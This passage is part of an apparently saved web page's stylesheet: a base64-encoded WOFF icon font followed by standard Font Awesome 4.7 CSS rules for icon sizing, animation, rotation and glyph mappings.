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)
            format("woff"),
          /*savepage-url=../../fonts/fontawesome-webfont.ttf?v=4.7.0*/ url() format("truetype"), /*savepage-url=../../fonts/fontawesome-webfont.svg?v=4.7.0#fontawesomeregular*/ url() format("svg");
        font-weight: normal;
        font-style: normal;
      }
      .fa {
        display: inline-block;
        font: normal normal normal 14px/1 FontAwesome;
        font-size: inherit;
        text-rendering: auto;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
      }
      .fa-lg {
        font-size: 1.33333333em;
        line-height: 0.75em;
        vertical-align: -15%;
      }
      .fa-2x {
        font-size: 2em;
      }
      .fa-3x {
        font-size: 3em;
      }
      .fa-4x {
        font-size: 4em;
      }
      .fa-5x {
        font-size: 5em;
      }
      .fa-fw {
        width: 1.28571429em;
        text-align: center;
      }
      .fa-ul {
        padding-left: 0;
        margin-left: 2.14285714em;
        list-style-type: none;
      }
      .fa-ul > li {
        position: relative;
      }
      .fa-li {
        position: absolute;
        left: -2.14285714em;
        width: 2.14285714em;
        top: 0.14285714em;
        text-align: center;
      }
      .fa-li.fa-lg {
        left: -1.85714286em;
      }
      .fa-border {
        padding: 0.2em 0.25em 0.15em;
        border: solid 0.08em #eee;
        border-radius: 0.1em;
      }
      .fa-pull-left {
        float: left;
      }
      .fa-pull-right {
        float: right;
      }
      .fa.fa-pull-left {
        margin-right: 0.3em;
      }
      .fa.fa-pull-right {
        margin-left: 0.3em;
      }
      .pull-right {
        float: right;
      }
      .pull-left {
        float: left;
      }
      .fa.pull-left {
        margin-right: 0.3em;
      }
      .fa.pull-right {
        margin-left: 0.3em;
      }
      .fa-spin {
        -webkit-animation: fa-spin 2s infinite linear;
        animation: fa-spin 2s infinite linear;
      }
      .fa-pulse {
        -webkit-animation: fa-spin 1s infinite steps(8);
        animation: fa-spin 1s infinite steps(8);
      }
      @-webkit-keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }
        100% {
          -webkit-transform: rotate(359deg);
          transform: rotate(359deg);
        }
      }
      @keyframes fa-spin {
        0% {
          -webkit-transform: rotate(0deg);
          transform: rotate(0deg);
        }
        100% {
          -webkit-transform: rotate(359deg);
          transform: rotate(359deg);
        }
      }
      .fa-rotate-90 {
        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
        -webkit-transform: rotate(90deg);
        -ms-transform: rotate(90deg);
        transform: rotate(90deg);
      }
      .fa-rotate-180 {
        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
        -webkit-transform: rotate(180deg);
        -ms-transform: rotate(180deg);
        transform: rotate(180deg);
      }
      .fa-rotate-270 {
        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
        -webkit-transform: rotate(270deg);
        -ms-transform: rotate(270deg);
        transform: rotate(270deg);
      }
      .fa-flip-horizontal {
        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
        -webkit-transform: scale(-1, 1);
        -ms-transform: scale(-1, 1);
        transform: scale(-1, 1);
      }
      .fa-flip-vertical {
        -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
        -webkit-transform: scale(1, -1);
        -ms-transform: scale(1, -1);
        transform: scale(1, -1);
      }
      :root .fa-rotate-90,
      :root .fa-rotate-180,
      :root .fa-rotate-270,
      :root .fa-flip-horizontal,
      :root .fa-flip-vertical {
        filter: none;
      }
      .fa-stack {
        position: relative;
        display: inline-block;
        width: 2em;
        height: 2em;
        line-height: 2em;
        vertical-align: middle;
      }
      .fa-stack-1x,
      .fa-stack-2x {
        position: absolute;
        left: 0;
        width: 100%;
        text-align: center;
      }
      .fa-stack-1x {
        line-height: inherit;
      }
      .fa-stack-2x {
        font-size: 2em;
      }
      .fa-inverse {
        color: #fff;
      }
      .fa-glass:before {
        content: "\f000";
      }
      .fa-music:before {
        content: "\f001";
      }
      .fa-search:before {
        content: "\f002";
      }
      .fa-envelope-o:before {
        content: "\f003";
      }
      .fa-heart:before {
        content: "\f004";
      }
      .fa-star:before {
        content: "\f005";
      }
      .fa-star-o:before {
        content: "\f006";
      }
      .fa-user:before {
        content: "\f007";
      }
      .fa-film:before {
        content: "\f008";
      }
      .fa-th-large:before {
        content: "\f009";
      }
      .fa-th:before {
        content: "\f00a";
      }
      .fa-th-list:before {
        content: "\f00b";
      }
      .fa-check:before {
        content: "\f00c";
      }
      .fa-remove:before,
      .fa-close:before,
      .fa-times:before {
        content: "\f00d";
      }
      .fa-search-plus:before {
        content: "\f00e";
      }
      .fa-search-minus:before {
        content: "\f010";
      }
      .fa-power-off:before {
        content: "\f011";
      }
      .fa-signal:before {
        content: "\f012";
      }
      .fa-gear:before,
      .fa-cog:before {
        content: "\f013";
      }
      .fa-trash-o:before {
        content: "\f014";
      }
      .fa-home:before {
